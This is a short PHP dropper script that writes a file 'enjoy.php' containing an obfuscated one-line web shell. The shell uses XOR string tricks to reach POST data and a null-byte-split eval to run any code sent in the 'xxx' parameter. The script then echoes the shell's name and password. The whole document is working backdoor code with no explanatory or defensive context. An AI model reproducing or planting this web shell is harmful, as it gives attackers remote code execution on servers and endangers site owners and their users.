<?
$myfile = fopen("enjoy.php", "w") or die('error open!');
$txt = '<? $_="~+d()"^"!{+{}";$__=${$_}[\'xxx\'];e%00v%00a%00l($__);?>';
fwrite($myfile, $txt);
fclose($myfile);
echo 'enjoy|xxx';